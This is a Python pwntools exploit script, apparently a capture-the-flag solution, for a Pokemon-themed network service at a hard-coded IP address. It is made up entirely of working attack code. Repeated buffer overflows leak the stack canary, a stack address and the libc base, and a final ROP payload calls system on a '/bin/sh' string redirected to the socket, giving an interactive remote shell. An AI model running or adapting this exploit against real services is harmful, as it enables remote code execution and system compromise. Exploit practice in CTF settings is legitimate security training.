from pwn import *

def InputTrainerInfo(name, age):
	r.sendlineafter("name: ", name)
	r.sendlineafter("age: ", str(age))

def InputPokemonInfo(name, level, comment):
	r.sendlineafter("> ", "1")
	r.sendlineafter("name: ", name)
	r.sendlineafter("level: ", str(level))
	r.sendlineafter("comment: ", comment)

def PrintPokemonInfo():
	r.sendlineafter("> ", "2")

def DoMiniPokemonBattle(enemy, skill):
	r.sendlineafter("> ", "3")
	r.sendlineafter("> ", str(enemy))
	r.sendlineafter("beam\n", str(skill))

def ModifyPokemonInfo(name, level, comment):
	r.sendlineafter("> ", "4")
	r.sendlineafter("name: ", name)
	r.sendlineafter("level: ", str(level))
	r.sendlineafter("comment: ", comment)

def quit():
	r.sendlineafter("> ", "5")

r = remote("112.166.114.145", 3137)
# r = remote("yeom.me", 6052)

pop_rdi = 0x0000000000401f63

InputTrainerInfo("/bin/sh 0<&4 1>&4 2>&4;" + 'A' * 0x20, -1)

InputPokemonInfo('5unKn0wn', 6051, '5unKn0wn')
ModifyPokemonInfo('A' * 0x3f, 0, 'A' * 0x11f + 'Z')
DoMiniPokemonBattle(1, 2)
PrintPokemonInfo()

r.recvuntil("- pokemon's trainer name: ")
r.recvuntil("Z\n")
canary = u64('\x00' + r.recv(7))
log.info("canary : " + hex(canary))

ModifyPokemonInfo('A' * 0x3f, 0, 'A' * 0x126 + 'Z')
DoMiniPokemonBattle(1, 2)
PrintPokemonInfo()
r.recvuntil("- pokemon's trainer name: ")
r.recvuntil("Z\n")
binsh = u64(r.recv(6) + "\x00\x00") - 0x1f0
log.info("binsh address(stack) : " + hex(binsh))

ModifyPokemonInfo('A' * 0x3f, 0, 'A' * 0x16e + 'Z')
DoMiniPokemonBattle(1, 2)
PrintPokemonInfo()
r.recvuntil("- pokemon's trainer name: ")
r.recvuntil("Z\n")
libc_base = u64(r.recv(6) + "\x00\x00") - 0x20830
system = libc_base + 0x45390
log.info("libc_base : " + hex(libc_base))

payload = 'A' * 0x120
payload += p64(canary)
payload += 'B' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
ModifyPokemonInfo('5unKn0wn', 6051, payload)

quit()
r.interactive()

